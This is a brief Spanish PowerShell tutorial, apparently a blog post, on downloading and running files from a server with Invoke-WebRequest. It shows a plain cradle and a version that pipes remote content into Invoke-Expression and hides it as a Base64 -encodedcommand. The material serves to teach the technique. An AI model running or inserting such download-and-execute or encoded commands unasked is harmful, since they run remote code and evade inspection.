# Formas de descargar y ejecutar ficheros desde un servidor en PowerShell utilizando Invoke-WebRequest
## PowerShell, Security 
### URL: https://www.jesusninoc.com/2018/05/26/formas-de-descargar-y-ejecutar-ficheros-desde-un-servidor-en-powershell-utilizando-invoke-webrequest/
```PowerShell
#Descargar y ejecutar un fichero .txt con cmdlets
powershell /c (Invoke-WebRequest -Uri 'https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt')

#Descargar y ejecutar un fichero mediante un cmdlet en Base64
$command="(Invoke-WebRequest -Uri 'https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt').content | iex"
$code=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
powershell -encodedcommand $code

```
